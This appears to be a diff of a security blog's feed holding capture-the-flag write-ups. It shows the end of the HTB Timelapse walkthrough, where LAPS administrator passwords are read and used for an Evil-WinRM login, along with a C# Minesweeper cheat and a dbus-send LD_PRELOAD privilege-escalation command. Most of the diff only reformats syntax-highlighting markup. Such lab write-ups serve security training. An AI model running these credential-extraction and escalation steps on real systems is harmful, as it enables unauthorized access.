+*Evil-WinRM* PS C:\Users\legacyy\Documents&amp;gt; invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime}
+PSComputerName              : localhost
+RunspaceId                  : e7ea358f-6d9c-47d5-b26a-2505848b8b58
+DistinguishedName           : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
+DNSHostName                 : dc01.timelapse.htb
+Enabled                     : True
+ms-Mcs-AdmPwd               : 3S5cxvMIgY{D9a2eP%l4}QOs
+ms-Mcs-AdmPwdExpirationTime : 133000468494251195
+Name                        : DC01
+ObjectClass                 : computer
+ObjectGUID                  : 6e10b102-6936-41aa-bb98-bed624c9b98f
+SamAccountName              : DC01$
+SID                         : S-1-5-21-671920749-559770252-3318990721-1000
+UserPrincipalName           :
+&lt;snip&gt;
+&lt;/snip&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;I was able to connect as &lt;code&gt;administrator&lt;/code&gt; using the retreived password and get the root 
+lag (which was located for an obscure reason on &lt;code&gt;TRX&lt;/code&gt; desktop).&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;└─$ evil-winrm -u administrator -p '3S5cxvMIgY{D9a2eP%l4}QOs' -i 10.129.227.105 -S ./ #thuglegacy
+*Evil-WinRM* PS C:\Users\Administrator\Documents&amp;gt; whoami
+timelapse\administrator
+*Evil-WinRM* PS C:\Users\Administrator&amp;gt; type ..\TRX\Desktop\root.txt
+0af718d3f4fe2658a8e38e07fa8a0a4e
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h1&gt;Wrapping up&lt;/h1&gt;
+&lt;p&gt;An interesting and easy box, cracking the zip password and just after the PFX file seems a bit redundant.
+Having the commands to run a process as another user in the PowerShell history file is nice
+as it might avoid some headaches.&lt;/p&gt;</content><category term="security"/><category term="security"/><category term="boot2root"/><category term="HTB"/><category term="SMB"/><category term="LAPS"/></entry><entry><title>HTB: Paper</title><link href="https://maggick.fr/2022/06/htb-paper.html" rel="alternate"/><published>2022-06-19T14:55:00+02:00</published><updated>2022-06-19T14:55:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2022-06-19:/2022/06/htb-paper.html</id><summary type="html">&lt;p&gt;&lt;img alt="Paper Card" class="align-left" src="/media/2022.06/paper_card.png" width="262"/&gt;&lt;/p&gt;
 &lt;p&gt;This article is a writeup about a retired HacktheBox machine:
 &lt;a href="https://www.hackthebox.com/home/machines/profile/432"&gt;Paper&lt;/a&gt; publish on
 February 05, 2022 by
@@ -17982,27 +18366,27 @@ compilation error. In order to fix it, we need to convert the value to byte:&lt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;We can for instance disable the failure when revealing a mine by changing the
 code of the &lt;code&gt;BombRevealed&lt;/code&gt; function and make it always return &lt;code&gt;false&lt;/code&gt;:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;public&lt;/span&gt; &lt;span class="nv"&gt;bool&lt;/span&gt; &lt;span class="nv"&gt;BombRevealed&lt;/span&gt;
-{
-  &lt;span class="nv"&gt;get&lt;/span&gt;
-  {
-    &lt;span class="nv"&gt;int&lt;/span&gt; &lt;span class="nv"&gt;num&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;
-    &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="ss"&gt;((&lt;/span&gt;&lt;span class="nv"&gt;long&lt;/span&gt;&lt;span class="ss"&gt;)&lt;/span&gt;&lt;span class="nv"&gt;num&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="ss"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;long&lt;/span&gt;&lt;span class="ss"&gt;)((&lt;/span&gt;&lt;span class="nv"&gt;ulong&lt;/span&gt;&lt;span class="ss"&gt;)&lt;/span&gt;&lt;span class="nv"&gt;this&lt;/span&gt;.&lt;span class="nv"&gt;Size&lt;/span&gt;&lt;span class="ss"&gt;))&lt;/span&gt;
-    {
-      &lt;span class="nv"&gt;int&lt;/span&gt; &lt;span class="nv"&gt;num2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;
-      &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="ss"&gt;((&lt;/span&gt;&lt;span class="nv"&gt;long&lt;/span&gt;&lt;span class="ss"&gt;)&lt;/span&gt;&lt;span class="nv"&gt;num2&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="ss"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;long&lt;/span&gt;&lt;span class="ss"&gt;)((&lt;/span&gt;&lt;span class="nv"&gt;ulong&lt;/span&gt;&lt;span class="ss"&gt;)&lt;/span&gt;&lt;span class="nv"&gt;this&lt;/span&gt;.&lt;span class="nv"&gt;Size&lt;/span&gt;&lt;span class="ss"&gt;))&lt;/span&gt;
-      {
-        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ss"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;this&lt;/span&gt;.&lt;span class="nv"&gt;MinesPresent&lt;/span&gt;[&lt;span class="nv"&gt;num2&lt;/span&gt;, &lt;span class="nv"&gt;num&lt;/span&gt;] &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nv"&gt;this&lt;/span&gt;.&lt;span class="nv"&gt;MinesVisible&lt;/span&gt;[&lt;span class="nv"&gt;num2&lt;/span&gt;, &lt;span class="nv"&gt;num&lt;/span&gt;]&lt;span class="ss"&gt;)&lt;/span&gt;
-        {
-          &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nv"&gt;false&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;
-        }
-        &lt;span class="nv"&gt;num2&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;
-      }
-      &lt;span class="nv"&gt;num&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;
-    }
-    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nv"&gt;false&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;
-  }
-}
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;public&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;bool&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;BombRevealed&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+{&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="nv"&gt;get&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;{&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nv"&gt;int&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;num&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;while&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;((&lt;/span&gt;&lt;span class="nv"&gt;long&lt;/span&gt;&lt;span class="ss"&gt;)&lt;/span&gt;&lt;span class="nv"&gt;num&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;long&lt;/span&gt;&lt;span class="ss"&gt;)((&lt;/span&gt;&lt;span class="nv"&gt;ulong&lt;/span&gt;&lt;span class="ss"&gt;)&lt;/span&gt;&lt;span class="nv"&gt;this&lt;/span&gt;.&lt;span class="nv"&gt;Size&lt;/span&gt;&lt;span class="ss"&gt;))&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;{&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="nv"&gt;int&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;num2&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="k"&gt;while&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;((&lt;/span&gt;&lt;span class="nv"&gt;long&lt;/span&gt;&lt;span class="ss"&gt;)&lt;/span&gt;&lt;span class="nv"&gt;num2&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;long&lt;/span&gt;&lt;span class="ss"&gt;)((&lt;/span&gt;&lt;span class="nv"&gt;ulong&lt;/span&gt;&lt;span class="ss"&gt;)&lt;/span&gt;&lt;span class="nv"&gt;this&lt;/span&gt;.&lt;span class="nv"&gt;Size&lt;/span&gt;&lt;span class="ss"&gt;))&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;      &lt;/span&gt;{&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;this&lt;/span&gt;.&lt;span class="nv"&gt;MinesPresent&lt;/span&gt;[&lt;span class="nv"&gt;num2&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;num&lt;/span&gt;]&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;this&lt;/span&gt;.&lt;span class="nv"&gt;MinesVisible&lt;/span&gt;[&lt;span class="nv"&gt;num2&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;num&lt;/span&gt;]&lt;span class="ss"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;        &lt;/span&gt;{&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;          &lt;/span&gt;&lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;false&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;        &lt;/span&gt;}&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="nv"&gt;num2&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;      &lt;/span&gt;}&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="nv"&gt;num&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;}&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;false&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;}&lt;span class="w"&gt;&lt;/span&gt;
+}&lt;span class="w"&gt;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;Then we can clic on every square and get the Success message.&lt;/p&gt;
 &lt;p&gt;&lt;img alt="Capture2.PNG" class="image-process-article-image" src="/media/2018.10/derivatives/article-image/Capture2.PNG"/&gt;&lt;/p&gt;
@@ -18487,15 +18871,15 @@ files and that a &lt;code&gt;.hiddenadmindirectory&lt;/code&gt; is present with 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;h3&gt;Reverse&lt;/h3&gt;
 &lt;p&gt;The note's content is the following:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;Nick&lt;/span&gt;,
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;Nick&lt;/span&gt;,&lt;span class="w"&gt;&lt;/span&gt;
 
-&lt;span class="nv"&gt;I&lt;/span&gt;&lt;span class="s1"&gt;'&lt;/span&gt;&lt;span class="s"&gt;m working on the backend permission stuff. Listen, it&lt;/span&gt;&lt;span class="s1"&gt;'&lt;/span&gt;&lt;span class="nv"&gt;s&lt;/span&gt; &lt;span class="nv"&gt;super&lt;/span&gt; &lt;span class="nv"&gt;prototype&lt;/span&gt; &lt;span class="nv"&gt;but&lt;/span&gt; &lt;span class="nv"&gt;I&lt;/span&gt; &lt;span class="nv"&gt;think&lt;/span&gt; &lt;span class="nv"&gt;it&lt;/span&gt;&lt;span class="s1"&gt;'&lt;/span&gt;&lt;span class="s"&gt;s going to work out great. Literally run the app, give your account password, and it will determine if you should have access to that file or not!&lt;/span&gt;
+&lt;span class="nv"&gt;I&lt;/span&gt;&lt;span class="s1"&gt;'m working on the backend permission stuff. Listen, it'&lt;/span&gt;&lt;span class="nv"&gt;s&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;super&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;prototype&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;but&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;I&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;think&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;it&lt;/span&gt;&lt;span class="err"&gt;'s going to work out great. Literally run the app, give your account password, and it will determine if you should have access to that file or not!&lt;/span&gt;
 
-&lt;span class="nv"&gt;It&lt;/span&gt;&lt;span class="s1"&gt;'&lt;/span&gt;&lt;span class="s"&gt;s great stuff! Once I&lt;/span&gt;&lt;span class="s1"&gt;'&lt;/span&gt;&lt;span class="nv"&gt;m&lt;/span&gt; &lt;span class="nv"&gt;finished&lt;/span&gt; &lt;span class="nv"&gt;with&lt;/span&gt; &lt;span class="nv"&gt;it&lt;/span&gt;, &lt;span class="nv"&gt;a&lt;/span&gt; &lt;span class="nv"&gt;hacker&lt;/span&gt; &lt;span class="nv"&gt;wouldn&lt;/span&gt;&lt;span class="s1"&gt;'&lt;/span&gt;&lt;span class="s"&gt;t even be able to reverse it! Keep in mind that it&lt;/span&gt;&lt;span class="s1"&gt;'&lt;/span&gt;&lt;span class="nv"&gt;s&lt;/span&gt; &lt;span class="nv"&gt;still&lt;/span&gt; &lt;span class="nv"&gt;a&lt;/span&gt; &lt;span class="nv"&gt;prototype&lt;/span&gt; &lt;span class="nv"&gt;right&lt;/span&gt; &lt;span class="nv"&gt;now&lt;/span&gt;. &lt;span class="nv"&gt;I&lt;/span&gt; &lt;span class="nv"&gt;am&lt;/span&gt; &lt;span class="nv"&gt;about&lt;/span&gt; &lt;span class="nv"&gt;to&lt;/span&gt; &lt;span class="nv"&gt;get&lt;/span&gt; &lt;span class="nv"&gt;it&lt;/span&gt; &lt;span class="nv"&gt;working&lt;/span&gt; &lt;span class="nv"&gt;with&lt;/span&gt; &lt;span class="nv"&gt;the&lt;/span&gt; &lt;span class="nv"&gt;Django&lt;/span&gt; &lt;span class="nv"&gt;user&lt;/span&gt; &lt;span class="nv"&gt;account&lt;/span&gt;. &lt;span class="nv"&gt;I&lt;/span&gt;&lt;span class="s1"&gt;'&lt;/span&gt;&lt;span class="s"&gt;m not sure how I&lt;/span&gt;&lt;span class="s1"&gt;'&lt;/span&gt;&lt;span class="nv"&gt;ll&lt;/span&gt; &lt;span class="nv"&gt;implement&lt;/span&gt; &lt;span class="nv"&gt;it&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="nv"&gt;the&lt;/span&gt; &lt;span class="nv"&gt;others&lt;/span&gt;. &lt;span class="nv"&gt;Maybe&lt;/span&gt; &lt;span class="nv"&gt;the&lt;/span&gt; &lt;span class="nv"&gt;webserver&lt;/span&gt; &lt;span class="nv"&gt;is&lt;/span&gt; &lt;span class="nv"&gt;the&lt;/span&gt; &lt;span class="nv"&gt;only&lt;/span&gt; &lt;span class="nv"&gt;one&lt;/span&gt; &lt;span class="nv"&gt;who&lt;/span&gt; &lt;span class="nv"&gt;needs&lt;/span&gt; &lt;span class="nv"&gt;to&lt;/span&gt; &lt;span class="nv"&gt;have&lt;/span&gt; &lt;span class="nv"&gt;root&lt;/span&gt; &lt;span class="nv"&gt;access&lt;/span&gt; &lt;span class="nv"&gt;sometimes&lt;/span&gt;?
+&lt;span class="nv"&gt;It&lt;/span&gt;&lt;span class="s1"&gt;'s great stuff! Once I'&lt;/span&gt;&lt;span class="nv"&gt;m&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;finished&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;with&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;it&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;a&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;hacker&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;wouldn&lt;/span&gt;&lt;span class="s1"&gt;'t even be able to reverse it! Keep in mind that it'&lt;/span&gt;&lt;span class="nv"&gt;s&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;still&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;a&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;prototype&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;right&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;now&lt;/span&gt;.&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;I&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;am&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;about&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;to&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;get&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;it&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;working&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;with&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;Django&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;user&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;account&lt;/span&gt;.&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;I&lt;/span&gt;&lt;span class="s1"&gt;'m not sure how I'&lt;/span&gt;&lt;span class="nv"&gt;ll&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;implement&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;it&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;others&lt;/span&gt;.&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;Maybe&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;webserver&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;is&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;only&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;one&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;who&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;needs&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;to&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;have&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;root&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;access&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;sometimes&lt;/span&gt;?&lt;span class="w"&gt;&lt;/span&gt;
 
-&lt;span class="nv"&gt;Let&lt;/span&gt; &lt;span class="nv"&gt;me&lt;/span&gt; &lt;span class="nv"&gt;know&lt;/span&gt; &lt;span class="nv"&gt;what&lt;/span&gt; &lt;span class="nv"&gt;you&lt;/span&gt; &lt;span class="nv"&gt;think&lt;/span&gt; &lt;span class="nv"&gt;of&lt;/span&gt; &lt;span class="nv"&gt;it&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;
+&lt;span class="nv"&gt;Let&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;me&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;know&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;what&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;you&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;think&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;of&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;it&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
 
-&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;Ashley&lt;/span&gt;
+&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;Ashley&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;We copy the executable to make it our own and be able to execute it:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;django&lt;/span&gt;&lt;span class="nv"&gt;@bulldog&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;cp&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;home&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;bulldogadmin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hiddenadmindirectory&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;customPermissionApp&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;chmod&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;customPermissionApp&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
@@ -19766,8 +20150,8 @@ interesting exploits :
 &lt;p&gt;&lt;a href="https://www.exploit-db.com/exploits/36820/"&gt;The CVE-2015-3643&lt;/a&gt; exploit the
 D-Bus listening on com.ubuntu.USBCreator.
 I try this exploit but the module was not available and failed:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;dbus&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="k"&gt;send&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="nv"&gt;print&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;reply&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="nv"&gt;system&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="nv"&gt;dest&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;com&lt;/span&gt;.&lt;span class="nv"&gt;ubuntu&lt;/span&gt;.&lt;span class="nv"&gt;USBCreator&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;com&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;ubuntu&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;USBCreator&lt;/span&gt; &lt;span class="nv"&gt;com&lt;/span&gt;.&lt;span class="nv"&gt;ubuntu&lt;/span&gt;.&lt;span class="nv"&gt;USBCreator&lt;/span&gt;.&lt;span class="nv"&gt;KVMTest&lt;/span&gt; &lt;span class="nv"&gt;string&lt;/span&gt;:&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;dev&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;sda&lt;/span&gt; &lt;span class="nv"&gt;dict&lt;/span&gt;:&lt;span class="nv"&gt;string&lt;/span&gt;:&lt;span class="nv"&gt;string&lt;/span&gt;:&lt;span class="nv"&gt;DISPLAY&lt;/span&gt;,&lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="s"&gt;foo&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt;,&lt;span class="nv"&gt;XAUTHORITY&lt;/span&gt;,&lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="s"&gt;foo&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt;,&lt;span class="nv"&gt;LD_PRELOAD&lt;/span&gt;,&lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="s"&gt;/tmp/test.so&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt;
